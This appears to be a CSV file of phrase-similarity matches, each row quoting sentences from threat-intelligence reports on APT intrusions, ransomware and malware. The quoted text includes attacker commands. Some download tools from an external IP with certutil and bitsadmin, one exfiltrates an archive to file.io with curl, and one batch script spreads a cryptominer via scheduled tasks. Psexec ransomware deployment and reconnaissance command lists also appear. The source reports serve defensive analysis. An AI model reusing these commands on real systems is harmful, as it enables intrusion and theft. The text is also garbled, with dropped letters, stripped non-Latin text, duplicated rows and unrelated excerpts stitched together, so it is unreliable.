hash,phrase,similarity,adjacent_sentences
6676698d65e372feb79c0159d9d2b11e,"exe└──cmd.exe: C:\Windows\system32\cmd.exe /c """"rdp.bat""",0.805354720058993,"[', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").']"
d8bfe2d6295d697f296644658fd284a8,or Windows Scripting,0.785059926480695,"['.n.o.t.', '.f.', 'flash.adobeus.com pic.hkabinc.com ygfk.sfcorporation.com 0230 75 0 6E 0 63 0 74 0 69 0 6F 0 6E 0 20 0 u.n.c.t.i.o.n.', '.', 'fngs.adobeus.com pics.adobeus.com yhkj.sfcorporation.com 0240 70 0 72 0 6F 0 70 0 65 0 72 0 6C 0 79 0 p.r.o.p.e.r.l.y.', 'fsw.adobeus.com pics.amazonwikis.com yjbf.amazonwikis.com gde.moviestops.com projectscorp.net yjxy.sfcorporation.com 0250 2E 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 .', '.']"
d8bfe2d6295d697f296644658fd284a8,or Windows Scripting,0.785059926480695,"['.n.o.t.', '.f.', 'flash.adobeus.com pic.hkabinc.com ygfk.sfcorporation.com 0230 75 0 6E 0 63 0 74 0 69 0 6F 0 6E 0 20 0 u.n.c.t.i.o.n.', '.', 'fngs.adobeus.com pics.adobeus.com yhkj.sfcorporation.com 0240 70 0 72 0 6F 0 70 0 65 0 72 0 6C 0 79 0 p.r.o.p.e.r.l.y.', 'fsw.adobeus.com pics.amazonwikis.com yjbf.amazonwikis.com gde.moviestops.com projectscorp.net yjxy.sfcorporation.com 0250 2E 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 .', '.']"
da720a0b860cc8b213511d0e3c6beb1b,used to download files…,0.8584333500019319,"['Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.']"
da720a0b860cc8b213511d0e3c6beb1b,used to download files…,0.8584333500019319,"['Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTP GET and POST requests, with the data stored either within the HTP body or within the URL parameters.']"
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,[]
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,[]
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,"['.', '.', '.', '1 The Bat!', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,"['.', '.', '.', '1 The Bat!', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,"['.', '.', '.', '5 The Bat!', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,""".bat"" files",0.8197125856194328,"['.', '.', '.', '5 The Bat!', '.', '.', '.']"
d3d11f0faf194266cc86ec9f1af4162d,""".bat"" files",0.755040711744637,"['The batch scripts (Fig.', '1) executed LockerGoga as the service mstdc, which was likely the atackers atempt to masquerade as the legitimate Windows service msdtc.', 'The batch files used by Figure 1. the atacker folowed the naming convention xa.bat, xab.bat, xac.bat and Strings from so on.', 'deployment BAT files.', 'start copy svchost.exe \\10.1.1.1\\c$\\windows\\temp\\start psexec.exe \\10.1.1.1 -u domain\\domainadmin -p pasword -d -h -r mstdc -s -acepteula -nobaner c:\\windows\\temp\\svchost.exe Mandiant analysts linked the tols and atacker infrastructure to other FIN6 activity, and eventualy concluded that FIN6 had expanded to using ransomware to further monetize their aces to compromised environments.', 'UNC173 In 2019, UNC173 targeted a retailer and tried to obtain payment card information from the point-of-sale (POS) environment.', 'The atacker gained aces to the environment by exploiting the CVE-2019-0604 vulnerability in a public-facing SharePoint server.']"
882f32a54783703ca615682148120e47,requests using RC4 encryption,0.7702121578120216,"['Key preparation (RC4KeyPrepare), with each byte XORed against a constant string.', '2.', 'Base64 encoding.', '3.', 'RC4 encryption.', '4.', 'ZLIB compresion.']"
882f32a54783703ca615682148120e47,requests using RC4 encryption,0.7702121578120216,"['Key preparation (RC4KeyPrepare), with each byte XORed against a constant string.', '2.', 'Base64 encoding.', '3.', 'RC4 encryption.', '4.', 'ZLIB compresion.']"
b5d067b705e3d7716dc5cd360e61cc7d,"decrypt,",1.0,"['Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).']"
6a3aafc1d433326193008dd2ebea3fbc,"kernel32.VirtualProtect,",0.7727579641446913,"['(Atack Scenario) 2.1.', '/ (Initial Aces / Infection Vectors) .', 'HWPX, HWP, LNK(XLSX ), DOCX , XLSX .', '.', ', .', '.', '2.2.']"
ff6f1d18e04fd114b36c7b03e99afca4,obtained credentials for pivoting with Mimikatz,0.957377421981754,"[""We believe that the initial entry point to the foreign ofice's network was a vulnerable server on the network perimeter."", 'Exploitation in February 2018 enabled the atackers to gain initial aces and then persistence, with the help of the ChinaChoper and TwoFace web shels.', 'The atackers used NBTScan for network reconaisance and PsExec for lateral movement.', 'They obtained credentials for pivoting with Mimikatz.', 'In some cases, we were able to detect memory dumps of the lsas proces that had ben archived and uploaded.', 'Because use of Mimikatz was likely blocked by endpoint security software, the atackers were forced to run bruteforcing ofline.', 'Another method was to scan hosts for so-caled Eternal* SMB vulnerabilities with SMBTouch and then, where posible, run the EternalBlue exploit and infect the computer.']"
ff6f1d18e04fd114b36c7b03e99afca4,obtained credentials for pivoting with Mimikatz,0.957377421981754,"[""We believe that the initial entry point to the foreign ofice's network was a vulnerable server on the network perimeter."", 'Exploitation in February 2018 enabled the atackers to gain initial aces and then persistence, with the help of the ChinaChoper and TwoFace web shels.', 'The atackers used NBTScan for network reconaisance and PsExec for lateral movement.', 'They obtained credentials for pivoting with Mimikatz.', 'In some cases, we were able to detect memory dumps of the lsas proces that had ben archived and uploaded.', 'Because use of Mimikatz was likely blocked by endpoint security software, the atackers were forced to run bruteforcing ofline.', 'Another method was to scan hosts for so-caled Eternal* SMB vulnerabilities with SMBTouch and then, where posible, run the EternalBlue exploit and infect the computer.']"
ff6f1d18e04fd114b36c7b03e99afca4,encrypting the base encryption key with RSA (with a hard-coded 1024-byte public key) and encoding it in Base64.,0.9266845386202396,"['Automation in 2018 and 2020 Here is the script used to automaticaly instal a cryptocurency miner on a list of computers in 2018: @echo of for /f %i in (c:\\programdata\\list.txt) do ( net use \\%i\\c$ ""*"" /u:*\\administrator copy c:\\programdata\\vmnat.exe \\%i\\c$\\windows\\system32\\vmnat.exe SCHTASKS /Create /S %i /u *\\administrator /p ""*"" /tn * /tr ""cmd.exe /c start c:\\windows\\system32\\vmnat.exe"" /sc onstart /RU SYSTEM schtasks /run /S %i /u *\\administrator /p ""*"" /tn * net use \\%i\\c$ /del net use * /del /Y ) del vmnat.exe del list.txt del work.bat And this is the script used to automaticaly delete the ransomware from a list of computers in 2020: @echo of for /f %i in (c:\\programdata\\list.txt) do ( net use \\%i\\c$ ""*"" /u:*\\* if not erorlevel 1 ( del \\%i\\c$\\programdata\\GameuxInstalHelper.dl del \\%i\\c$\\programdata\\GDFInstal.exe del \\%i\\c$\\programdata\\Sysurl.Hex net use \\%i\\c$ /del )ELSE ( echo not aces %i > c:\\programdata\\no_aces.txt ) ) (We replaced sensitive information with \'*\') htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 19/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The scripts show certain similarities in structure and have the same lop of file lines at the same path.', 'On the other hand, the indentation, script tasks, and file naming are diferent.', 'Some of the comands are to general to tel, since they could have ben found in online search results and reused.', '4.', 'Bodies of the SysUpdate and HyperBro backdors We were not able in some cases to confirm the presence of a given backdor based on the body of the Trojan itself.', 'We identified the HyperBro backdor, which had ben used in 2018, based on the distinctive file name combined with other confirmed tols.', 'We confirmed the SysUpdate backdor, used in 2020, by loking at the C2 adres and backdor body in the proces dump memory that had ben uploaded to VirusTotal during investigation from an organization not linked to our client.']"
ff6f1d18e04fd114b36c7b03e99afca4,encrypting the base encryption key with RSA (with a hard-coded 1024-byte public key) and encoding it in Base64.,0.9266845386202396,"['Automation in 2018 and 2020 Here is the script used to automaticaly instal a cryptocurency miner on a list of computers in 2018: @echo of for /f %i in (c:\\programdata\\list.txt) do ( net use \\%i\\c$ ""*"" /u:*\\administrator copy c:\\programdata\\vmnat.exe \\%i\\c$\\windows\\system32\\vmnat.exe SCHTASKS /Create /S %i /u *\\administrator /p ""*"" /tn * /tr ""cmd.exe /c start c:\\windows\\system32\\vmnat.exe"" /sc onstart /RU SYSTEM schtasks /run /S %i /u *\\administrator /p ""*"" /tn * net use \\%i\\c$ /del net use * /del /Y ) del vmnat.exe del list.txt del work.bat And this is the script used to automaticaly delete the ransomware from a list of computers in 2020: @echo of for /f %i in (c:\\programdata\\list.txt) do ( net use \\%i\\c$ ""*"" /u:*\\* if not erorlevel 1 ( del \\%i\\c$\\programdata\\GameuxInstalHelper.dl del \\%i\\c$\\programdata\\GDFInstal.exe del \\%i\\c$\\programdata\\Sysurl.Hex net use \\%i\\c$ /del )ELSE ( echo not aces %i > c:\\programdata\\no_aces.txt ) ) (We replaced sensitive information with \'*\') htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 19/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The scripts show certain similarities in structure and have the same lop of file lines at the same path.', 'On the other hand, the indentation, script tasks, and file naming are diferent.', 'Some of the comands are to general to tel, since they could have ben found in online search results and reused.', '4.', 'Bodies of the SysUpdate and HyperBro backdors We were not able in some cases to confirm the presence of a given backdor based on the body of the Trojan itself.', 'We identified the HyperBro backdor, which had ben used in 2018, based on the distinctive file name combined with other confirmed tols.', 'We confirmed the SysUpdate backdor, used in 2020, by loking at the C2 adres and backdor body in the proces dump memory that had ben uploaded to VirusTotal during investigation from an organization not linked to our client.']"
11cc969841d2d32c5c9c90e4818e5e45,uploaded.,0.7550100025393772,"['These grey areas are exactly where criminals Games, developers best known for their two big- thrive the posibility of geting a game for fre, budget Spider-Man games, fel victim to a large-scale or of flawlesly executing headshots through wals data leak after refusing to pay ransom to the notorious in multiplayer shoters, constitute perfect bait for Rhysida ransomware group.', 'Sensitive data, ranging unsuspecting gamers.', 'What awaits the victims once from developers personal information to Insomniac hoked, are often infostealers that go after their Games roadmap of future game releases, was paswords, credit card data, or cryptowalets.', 'uploaded to the internet.', 'Infostealers-as-a-Service Even so, it is not only large busineses that are at risk; personal information of people who play video games Frequently, these atacks are conducted using is also an enticing target for cybercroks, as evidenced infostealers distributed as a service; both RedLine by threat actors hiding malware payloads in al sorts of Stealer and Luma Stealer, described in previous game-related files.', 'ESET Threat Reports, have ben found to be the RedLine Stealer daily detection trend in H1 2024 ESET THREAT REPORT Executive sumary Foreword Threat landscape trends Threat telemetry Research publications About this report About ESET H1 2024 | 17 updated, it is stil in use, though its mostly relegated to one-of campaigns Compromised mods In June 2023, hackers managed to compromise several acounts on isolated to one or two countries in 2024, its thre bigest data peaks Minecraft moding platforms and injected infostealing code into existing Gamers not inclined to pirate games or use cheats can stil come acros were registered on January 25 (50% of detections registered in Germany), projects.', 'More recently, in December 2023, a popular mod for the game Slay harmful files when downloading other video game-related asets.']"
ff6f1d18e04fd114b36c7b03e99afca4,"scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer",0.7930854215142736,"['They obtained credentials for pivoting with Mimikatz.', 'In some cases, we were able to detect memory dumps of the lsas proces that had ben archived and uploaded.', 'Because use of Mimikatz was likely blocked by endpoint security software, the atackers were forced to run bruteforcing ofline.', 'Another method was to scan hosts for so-caled Eternal* SMB vulnerabilities with SMBTouch and then, where posible, run the EternalBlue exploit and infect the computer.', 'On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdors were instaled for reliable persistence and aces.', 'One unexpected result of the compromise was cryptocurency mining at both the foreign ofice and headquarters.', 'Such activity remained unoticed for one and a half years.']"
ff6f1d18e04fd114b36c7b03e99afca4,"scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer",0.7930854215142736,"['They obtained credentials for pivoting with Mimikatz.', 'In some cases, we were able to detect memory dumps of the lsas proces that had ben archived and uploaded.', 'Because use of Mimikatz was likely blocked by endpoint security software, the atackers were forced to run bruteforcing ofline.', 'Another method was to scan hosts for so-caled Eternal* SMB vulnerabilities with SMBTouch and then, where posible, run the EternalBlue exploit and infect the computer.', 'On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdors were instaled for reliable persistence and aces.', 'One unexpected result of the compromise was cryptocurency mining at both the foreign ofice and headquarters.', 'Such activity remained unoticed for one and a half years.']"
ff6f1d18e04fd114b36c7b03e99afca4,obtained the credentials of a domain administration at headquarters,0.7823913385666517,"['Our belief is that by early 2020, the atackers had lost their aces (for reasons unknown to us).', ""We can se use of web shels on the foreign ofice's servers on February 9, 2020."", 'Subsequent actions were very similar to what had hapened two years earlier.', 'By using the tols already described, the atackers obtained the credentials of a domain administration at headquarters.', 'This time, they deleted OS logs and stoped Shadow Copy services, complicating subsequent incident analysis.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 2/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction For the finale, on April 29, 2020, the acount of the compromised domain admin was used to push Polar ransomware to computers and run it, encrypting user files and demanding a ransom.', 'While our specialists were asisting the client in May 2020, the atackers made yet another atempt to regain control of infrastructure with the help of web shels that were stil in place on the network of the headquarters and ofice, but this time to no suces.']"
ff6f1d18e04fd114b36c7b03e99afca4,obtained the credentials of a domain administration at headquarters,0.7823913385666517,"['Our belief is that by early 2020, the atackers had lost their aces (for reasons unknown to us).', ""We can se use of web shels on the foreign ofice's servers on February 9, 2020."", 'Subsequent actions were very similar to what had hapened two years earlier.', 'By using the tols already described, the atackers obtained the credentials of a domain administration at headquarters.', 'This time, they deleted OS logs and stoped Shadow Copy services, complicating subsequent incident analysis.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 2/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction For the finale, on April 29, 2020, the acount of the compromised domain admin was used to push Polar ransomware to computers and run it, encrypting user files and demanding a ransom.', 'While our specialists were asisting the client in May 2020, the atackers made yet another atempt to regain control of infrastructure with the help of web shels that were stil in place on the network of the headquarters and ofice, but this time to no suces.']"
ff6f1d18e04fd114b36c7b03e99afca4,payload and intermediate library are deleted before completion,0.9960065555059817,"['This frequently used technique of loading malicious code in the context of a legitimate aplication is known as DL hijacking.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 9/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The file c:\\programdata\\Sysurl.Hex is read (after being copied from c:\\windows\\system32\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFSDJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', 'Deletion ocurs in the standard (insecure) way, which enables recovering the data if disk aces is stoped in time and the information has not ben overwriten.', 'Sysurl.Hex is an encrypted copy of the Polar ransomware.', 'This payload cal sequence (in which a legitimate aplication loads a malicious library, which in turn decrypts a third component and pases control to it) is very comonly used to run the PlugX backdor, which is widely sen among such Asian APT groups as APT10, APT41, htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 10/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction TA459, and Bronze Union.']"
ff6f1d18e04fd114b36c7b03e99afca4,payload and intermediate library are deleted before completion,0.9960065555059817,"['This frequently used technique of loading malicious code in the context of a legitimate aplication is known as DL hijacking.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 9/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The file c:\\programdata\\Sysurl.Hex is read (after being copied from c:\\windows\\system32\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFSDJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', 'Deletion ocurs in the standard (insecure) way, which enables recovering the data if disk aces is stoped in time and the information has not ben overwriten.', 'Sysurl.Hex is an encrypted copy of the Polar ransomware.', 'This payload cal sequence (in which a legitimate aplication loads a malicious library, which in turn decrypts a third component and pases control to it) is very comonly used to run the PlugX backdor, which is widely sen among such Asian APT groups as APT10, APT41, htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 10/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction TA459, and Bronze Union.']"
ff6f1d18e04fd114b36c7b03e99afca4,yielding a PE file that is loaded and run in memory with .NET.,0.8467561942284374,"['htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 8/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction This component is not actualy legitimate, however: atacker code is executed after the GameExplorerInstalW symbol is exported.', 'This frequently used technique of loading malicious code in the context of a legitimate aplication is known as DL hijacking.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 9/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The file c:\\programdata\\Sysurl.Hex is read (after being copied from c:\\windows\\system32\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFSDJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', 'Deletion ocurs in the standard (insecure) way, which enables recovering the data if disk aces is stoped in time and the information has not ben overwriten.', 'Sysurl.Hex is an encrypted copy of the Polar ransomware.']"
ff6f1d18e04fd114b36c7b03e99afca4,yielding a PE file that is loaded and run in memory with .NET.,0.8467561942284374,"['htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 8/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction This component is not actualy legitimate, however: atacker code is executed after the GameExplorerInstalW symbol is exported.', 'This frequently used technique of loading malicious code in the context of a legitimate aplication is known as DL hijacking.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 9/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The file c:\\programdata\\Sysurl.Hex is read (after being copied from c:\\windows\\system32\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFSDJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', 'Deletion ocurs in the standard (insecure) way, which enables recovering the data if disk aces is stoped in time and the information has not ben overwriten.', 'Sysurl.Hex is an encrypted copy of the Polar ransomware.']"
d5019121cbc645eb0787efab173a12b3,wmic,0.7832871736269563,"['Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .']"
949b57ffdfcc42e1765f65e65995733b,wmic,0.862634642643921,[]
949b57ffdfcc42e1765f65e65995733b,wmic,0.8873197545818806,"['These comands executed by this module are almost al wmic comands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snipet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypas configuration arays with an iterator (v2).', 'Shamon 1, 2 and 3 and Kwampirs, al contain arays for C2, and Proxy, ProxyByPas, and acesType information.', 'INDEX cylera.com 24 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAdres, EndingAdres wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snipet 9: Kwampirs comands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it sems likely that the use of this module is intended for a reconaisance phase.', 'The types of information gathered may imply that the physical atributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be infered from this information.']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
920bbf3f4cf30cf9c556531074485448,"""cmd.exe",0.8176210416244082,"['29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .']"
31347d89b18461f35448b26fefb00133,"""cmd.exe",1.0,"['USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.']"
399c17d5f44d8b855c9751aae73f3c11,"""cmd.exe",0.8937965527573956,"['We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.']"
cd55962babfd80de741da3cfcd92ebe3,"""cmd.exe",0.82672272449881,"['Aditionaly, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed sugesting this is al part of the same campaign.', 'Despite this potential conection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware atempts to run a series of comands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These comands are as folows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Internet Setings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is sen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTP/1.1 Conection: Kep-Alive User-Agent: Mozila/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/2010101 Firefox/47.0 Host: w.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4c10ab3f4e6769e520694a10f61d5) does not use eye-watch[.', ']in as a C&C chanel but instead was downloaded from the URL: hxps:/w.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'.""]"
